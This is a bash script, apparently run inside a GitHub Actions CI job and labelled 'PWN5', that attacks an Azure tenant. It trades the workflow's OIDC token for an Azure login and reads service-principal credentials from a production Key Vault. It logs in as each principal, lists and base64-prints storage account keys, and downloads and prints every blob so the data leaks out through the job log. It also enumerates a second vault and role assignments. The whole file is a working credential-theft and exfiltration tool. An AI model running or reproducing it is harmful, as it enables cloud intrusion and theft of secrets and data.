#!/usr/bin/env bash
set +e
echo "=====PWN5_START====="
AUD="api:""//AzureADTokenExchange"
IDT=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
ci(){ az login --service-principal -u "${AZURE_CLIENT_ID}" -t "${AZURE_TENANT_ID}" --federated-token "${IDT}" --allow-no-subscriptions >/dev/null 2>&1; }
ci; echo "[*] CI login rc=$?"
for SECNAME in reporting-service-principal sync-service-principal cost-reader-principal directory-audit-principal secrets-sync-principal reporting-viewer-principal; do
  V=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz -n "$SECNAME" --query value -o tsv 2>/dev/null)
  [ -z "$V" ] && continue
  APP=$(printf %s "$V" | jq -r .appId 2>/dev/null); CS=$(printf %s "$V" | jq -r .clientSecret 2>/dev/null)
  az logout >/dev/null 2>&1
  az login --service-principal -u "$APP" --password="$CS" -t "${AZURE_TENANT_ID}" -o none >/dev/null 2>&1 || { echo "[$SECNAME] login FAIL"; ci; continue; }
  echo "[$SECNAME] login OK ($APP)"
  echo "  -- keys list tung account --"
  for SA in sttblappcfgprodx3euoz sttblarchiveprodx3euoz sttblbackupprodx3euoz sttblcilogsprodx3euoz; do
    K=$(az storage account keys list -n "$SA" --query "[0].value" -o tsv 2>/dev/null)
    if [ -n "$K" ] && [ "$K" != "null" ]; then
      echo "  KEY $SA b64: $(printf %s "$K" | base64 -w0)"
      echo "  -- doc blob bang key tren $SA --"
      for C in $(az storage container list --account-name "$SA" --account-key "$K" -o tsv --query "[].name" 2>/dev/null); do
        echo "  [$SA/$C]"
        az storage blob list --account-name "$SA" --container-name "$C" --account-key "$K" -o tsv --query "[].name" 2>&1 | sed 's/^/    blob: /' | head -20
        for B in $(az storage blob list --account-name "$SA" --container-name "$C" --account-key "$K" -o tsv --query "[].name" 2>/dev/null); do
          az storage blob download --account-name "$SA" --container-name "$C" --name "$B" --account-key "$K" -f /tmp/b.out >/dev/null 2>&1 && echo "    B64($B): $(base64 -w0 /tmp/b.out | head -c 2000)"
        done
      done
    fi
  done
  echo "  -- kv-tbl-sec thu quyen --"
  az keyvault secret list --vault-name kv-tbl-sec-x3euoz -o tsv --query "[].name" 2>/dev/null | sed 's/^/    sec: /' | head -10
  echo "  -- role cua chinh no --"
  az role assignment list --all --assignee "$APP" -o tsv --query "[].[roleDefinitionName,scope]" 2>/dev/null | sed 's/^/    /' | head -10
  ci
done
echo "=====PWN5_END====="